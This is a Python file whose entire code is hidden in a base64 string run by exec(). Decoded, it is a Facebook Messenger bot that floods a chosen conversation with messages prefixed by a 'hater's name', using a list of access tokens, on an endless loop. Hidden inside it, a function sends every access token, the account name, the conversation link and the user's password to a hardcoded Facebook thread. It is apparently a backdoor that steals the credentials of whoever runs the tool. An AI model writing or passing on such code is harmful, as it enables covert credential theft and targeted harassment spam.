import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIie3sgKEhJTUFOU0hVKSB9fSIpCgpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToKCVBPUlQgPSA0MDAwCgoJd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6CgkJcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkKCQlodHRwZC5zZXJ2ZV9mb3JldmVyKCkKCmRlZiBzZW5kX21lc3NhZ2VzKCk6Cgl3aXRoIG9wZW4oJ3Bhc3N3b3JkLnR4dCcsICdyJykgYXMgZmlsZToKCQlwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgllbnRlcmVkX3Bhc3N3b3JkID0gcGFzc3dvcmQKCglpZiBlbnRlcmVkX3Bhc3N3b3JkICE9IHBhc3N3b3JkOgoJCXByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKCQlzeXMuZXhpdCgpCgoJd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CgkJdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQoJbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCgoJcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCglkZWYgY2xzKCk6CgkJaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKCQkJb3Muc3lzdGVtKCdjbGVhcicpCgkJZWxzZToKCQkJaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgoJCQkJb3Muc3lzdGVtKCdjbHMnKQoJY2xzKCkKCglkZWYgbGluZXNzKCk6CgkJcHJpbnQoJ1x1MDAxYlszN20nICsgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCgoJaGVhZGVycyA9IHsKCQknQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKCQknQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAoJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAoJCSdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAoJCSdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCgkJJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKCQknQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKCQkncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKCX0KCgkjbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvbktHakpHbTknKS50ZXh0CgoJI2lmIG1tbSBub3QgaW4gcGFzc3dvcmQ6CgkJI3ByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKCQkjc3lzLmV4aXQoKQoKCWxpbmVzcygpCgoJYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdCgoJd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CgkJY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCdmaWxlLnR4dCcsICdyJykgYXMgZmlsZToKCQl0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4odGV4dF9maWxlX3BhdGgsICdyJykgYXMgZmlsZToKCQltZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCgludW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpCgltYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykKCgl3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCWhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6CgkJc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCglsaW5lc3MoKQoJCglkZWYgZ2V0TmFtZSh0b2tlbik6CgkJdHJ5OgoJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAvbWU/YWNjZXNzX3Rva2VuPXt0b2tlbn0nKS5qc29uKCkKCQlleGNlcHQ6CgkJCWRhdGEgPSAiIgoJCWlmICduYW1lJyBpbiBkYXRhOgoJCQlyZXR1cm4gZGF0YVsnbmFtZSddCgkJZWxzZToKCQkJcmV0dXJuICJFcnJvciBvY2N1cmVkIgoKCWRlZiBtc2coKToKCQlwYXJhbWV0ZXJzID0gewoJCQknYWNjZXNzX3Rva2VuJyA6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksCgkJCSdtZXNzYWdlJzogJ2hlbGxvIGhpbXUgcGFwYSAgaSBhbSB1c2luZyB5b3VyIHNlcnZlciBiZWNhdXNlIHlvdSBhcmUgbXkgZmF0aGVyIG15IG5hbWUgYW5kIHRva2VuIHllIHJoZSA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXG4gVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1xuIExpbmsgOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWVzc2FnZXMvdC8nK2NvbnZvX2lkKydcbiBQYXNzd29yZDogJytwYXNzd29yZAoJCX0KCQl0cnk6CgkJCXMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzEwMDAwNzUxMDQ0NzE3Mi8iLCBkYXRhPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQlleGNlcHQ6CgkJCXBhc3MKCQoJbXNnKCkKCXdoaWxlIFRydWU6CgkJdHJ5OgoJCQlmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOgoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2VucwoJCQkJYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0KCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKCQkJCXVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC97fS8iLmZvcm1hdCgndF8nK2NvbnZvX2lkKQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0KCQkJCXJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoJCQkJCgoJCQkJY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiJVktJW0tJWQgJUk6JU06JVMgJXAiKQoJCQkJaWYgcmVzcG9uc2Uub2s6CgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KAoJCQkJCQltZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkKCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkKCQkJCQlsaW5lc3MoKQoJCQkJCWxpbmVzcygpCgkJCQllbHNlOgoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJdGltZS5zbGVlcChzcGVlZCkKCgkJCXByaW50KCJbK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi4iKQoJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQkJcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkKCgoKZGVmIG1haW4oKToKCXNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKCXNlcnZlcl90aHJlYWQuc3RhcnQoKQoJCglzZW5kX21lc3NhZ2VzKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CgltYWluKCkK'))
